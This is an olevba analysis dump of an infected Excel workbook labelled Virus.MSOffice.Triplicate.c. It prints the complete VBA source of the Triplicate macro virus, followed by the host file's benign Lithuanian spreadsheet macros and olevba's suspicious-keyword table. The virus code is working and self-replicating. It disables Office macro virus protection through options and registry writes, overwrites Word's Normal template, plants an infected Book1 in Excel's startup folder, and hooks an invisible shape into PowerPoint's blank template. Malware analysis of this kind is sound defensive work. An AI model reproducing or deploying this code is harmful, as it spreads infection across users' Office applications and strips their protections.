olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'Triplicate v0.21 /1nternal
Private Sub Document_Close()
    On Error Resume Next
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set TT = Templates(1).VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
        AD.DeleteLines 1, AD.CountofLines
        AD.InsertLines 1, TT.Lines(1, TT.CountofLines)
        If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
            AD.InsertLines 1, NT.Lines(1, NT.CountofLines)
        End If
    End If
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        NT.DeleteLines 1, NT.CountofLines
        NT.InsertLines 1, AD.Lines(1, AD.CountofLines)
        Set xlApp = CreateObject("Excel.Application")
        If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Check"
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Whoa"
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountofLines)
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
        End If
        xlApp.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Triplicate" Then dontadd = True
        Next
        If dontadd <> True Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Triplicate"
            NewMod.CodeModule.InsertLines 1, NT.Lines(1, NT.CountofLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Triplicate"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
    End If
    If TT.Lines(1, 1) <> "'<!--1nternal-->" Then
        TT.DeleteLines 1, TT.CountofLines
        TT.InsertLines 1, NT.Lines(1, NT.CountofLines)
    End If
End Sub
Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
        Set WordObj = GetObject(, "Word.Application")
        If WordObj = "" Then
            Set WordObj = CreateObject("Word.Application")
            WQuit = True
        End If
        Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
        WordObj.Options.SaveNormalPrompt = False
        NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + TW.Lines(23, 3) + Chr(13) + Chr(10) + TW.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
        WordObj.Run "Normal.ThisDocument.DisableAV"
        NT.DeleteLines 1, NT.CountofLines
        NT.InsertLines 1, TW.Lines(1, TW.CountofLines)
        Set NT = Nothing
        If WQuit = True Then WordObj.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Triplicate" Then dontadd = True
        Next
        If dontadd <> True Then
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Triplicate"
            NewMod.CodeModule.InsertLines 1, TW.Lines(1, TW.CountofLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Triplicate"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountofLines)
        Book1Obj.SaveAs Filename:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
        Book1Obj.Close
        xlApp.Quit
    End If
    If AW.Lines(1, 1) <> "'<!--1nternal-->" Then
        AW.InsertLines 1, TW.Lines(1, TW.CountofLines)
    End If
End Sub
Private Sub actionhook(tristate)
    On Error Resume Next
    If Int(Rnd * 7) = 0 Then
        Set Home = ActivePresentation
        If UCase(Dir(Application.Path + "\Xlstart\Book1.")) <> UCase("BOOK1") Then
            Set WordObj = GetObject(, "Word.Application")
            If WordObj = "" Then
                Set WordObj = CreateObject("Word.Application")
                WQuit = True
            End If
            Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
            WordObj.Options.SaveNormalPrompt = False
            NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(23, 3) + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
            WordObj.Run "Normal.ThisDocument.DisableAV"
            NT.DeleteLines 1, NT.CountofLines
            NT.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
            NT.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Set NT = Nothing
            If WQuit = True Then WordObj.Quit
            Set xlApp = CreateObject("Excel.Application")
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
            xlApp.Quit
            Set PBT = Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
            dontadd = False
            For Each ModComponent In PBT.VBProject.VBComponents
                If ModComponent.Name = "Triplicate" Then dontadd = True
            Next
            If dontadd <> True Then
                Set NewMod = PBT.VBProject.VBComponents.Add(1)
                NewMod.Name = "Triplicate"
                NewMod.CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountofLines)
                Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
                With ShapetoWack
                    .Name = "Triplicate"
                    .ZOrder (1)
                    .Line.Visible = False
                    .Fill.Visible = False
                    .ActionSettings(1).Action = 8
                    .ActionSettings(1).Run = "actionhook"
                End With
                PBT.Save
            End If
            PBT.Close
        End If
    End If
    ActivePresentation.SlideShowWindow.View.Next
End Sub
Option Explicit


Private Sub Workbook_Open()
'
'VK
'

    With Application.CommandBars("Worksheet Menu Bar").Controls
        'kuriama meniu DU
        With .Add(Type:=msoControlPopup, Before:=9)
            .Caption = "DU"
            With .Controls
                With .Add(Type:=msoControlButton)
                    .Caption = "Rodyti/slėpti stulpelius"
                    .OnAction = "RodytiSleptiStulpelius"
                End With
                With .Add(Type:=msoControlButton)
                    .Caption = "Daryti pirmojo knygos lapo kopiją"
                    .OnAction = "DarytiPirmojoKnygosLapoKopija"
                End With
                With .Add(Type:=msoControlButton)
                    .Caption = "Užrakinti/atrakinti pasirinktą ląstelę"
                    .OnAction = "LastelesRakinimas"
                End With
                With .Add(Type:=msoControlButton)
                    .Caption = "Sujungti pasirinktas ląsteles"
                    .OnAction = "Lasteliu_sujungimas"
                End With
                With .Add(Type:=msoControlButton)
                    .Caption = "Numeruoti eiluites"
                    .OnAction = "Numeravimas"
                End With
                With .Add(Type:=msoControlButton)
                    .Caption = ""
                    .OnAction = "Lasteliu_sujungimas"
                End With

            End With
        End With
    End With
End Sub

Private Sub Workbook_BeforeClose(Cancel As Boolean)
'
'VK
'
    Dim con As CommandBarControl
    
    For Each con In Application.CommandBars("Worksheet Menu Bar").Controls
        If Not con.BuiltIn Then con.Delete
    Next
End Sub



Sub aaa()
'
'VK
'
    
    Workbook_BeforeClose (True)
End Sub


-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO frmSV.frm 
in file: Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de - OLE stream: '_VBA_PROJECT_CUR/VBA/frmSV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Dim r As Range
Dim c As Range
Dim lp As String     'lapo pavadinimas


  
Private Sub CheckBox1_Change()
'
'VK
'
    Dim i As Integer
    
    With lstPavardes
        i = 0
        For Each c In r.Cells
            If c.Value = lp Then
                If CheckBox1.Value Then
                    .List(i, 0) = "(" + c.Offset(0, 2).Value + ")  " + c.Offset(0, 1).Value
                Else
                    .List(i, 0) = c.Offset(0, 1).Value
                End If
                i = i + 1
            End If
         Next c
    End With
    
    Worksheets("Parametrai").Range("Rodyti_stulpelio_raide").Value = IIf(CheckBox1.Value, 1, 0)

End Sub


Private Sub UserForm_Initialize()
'
'VK
'
    Dim c As Range
    Dim i As Integer
    Caption = "Stulpelių rodymas/slėpimas"
    cmdOK.Caption = "OK"
    cmdExit.Caption = "Baigti"
    CheckBox1.Caption = "Rodyti stulpelio raidę"
    
    lp = ActiveSheet.Name
    If lp = "Parametrai" Then End
    
    With Worksheets("Parametrai")
'        .Range("A20").Sort _
'            key1:=.Columns("A"), order1:=xlAscending, _
'            key2:=.Columns("C"), order2:=xlAscending, _
'            Header:=xlNo
        Set r = .Range("A20").CurrentRegion.Columns("A")
    End With
    
    With lstPavardes
        .Clear
        .ColumnCount = 1
        .MultiSelect = fmMultiSelectMulti
        i = 0
        For Each c In r.Cells
            If c.Value = lp Then
                .AddItem c.Offset(0, 1).Value
                .Selected(i) = IIf(c.Offset(0, 3).Value = 1, True, False)
                i = i + 1
            End If
         Next c
    End With
    
    CheckBox1.Value = IIf(Worksheets("Parametrai").Range("Rodyti_stulpelio_raide").Value = 1, True, False)
    
End Sub

Private Sub cmdOK_Click()
'
'VK
'
    Dim i As Integer
    Dim Stulpelis As String
    Dim prot As Boolean             'požymis - knygos lapas apsaugotas
    
    Application.ScreenUpdating = False
    
    prot = False
    
    If ActiveSheet.ProtectContents = True Then
        prot = True
        ActiveSheet.Unprotect
    End If
    
    With lstPavardes
        i = 0
        For Each c In r.Cells
            If c.Value = lp Then
                Stulpelis = UCase(c.Offset(0, 2))
                If .Selected(i) Then
                    c.Offset(0, 3) = 1
                    ActiveSheet.Columns(Stulpelis).Hidden = False
                Else
                    c.Offset(0, 3) = 0
                    ActiveSheet.Columns(Stulpelis).Hidden = True
                End If
                i = i + 1
            End If
         Next c
    End With
    
    If prot Then ActiveSheet.Protect
    Application.ScreenUpdating = True
    
End Sub


Private Sub cmdExit_Click()
'
'VK
'
    
    End
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     27 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  SKAICIAVIMO LENTEL
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DYDZIA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de' - OLE stream: '_VBA_PROJECT_CUR/frmSV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�aaaaaaaaaa
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de' - OLE stream: '_VBA_PROJECT_CUR/frmSV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de' - OLE stream: '_VBA_PROJECT_CUR/frmSV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�CommandButton1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de' - OLE stream: '_VBA_PROJECT_CUR/frmSV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de' - OLE stream: '_VBA_PROJECT_CUR/frmSV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CheckBox1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de' - OLE stream: '_VBA_PROJECT_CUR/frmSV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de' - OLE stream: '_VBA_PROJECT_CUR/frmSV/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de' - OLE stream: '_VBA_PROJECT_CUR/frmSV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdExit'" IN 'Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de' - OLE stream: '_VBA_PROJECT_CUR/frmSV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de' - OLE stream: '_VBA_PROJECT_CUR/frmSV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'lstPavardes'" IN 'Virus.MSOffice.Triplicate.c-b8a30b13dfe879879c8d35338a98fc34ee5350de' - OLE stream: '_VBA_PROJECT_CUR/frmSV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|AutoExec  |cmdOK_Click         |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |CheckBox1_Change    |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

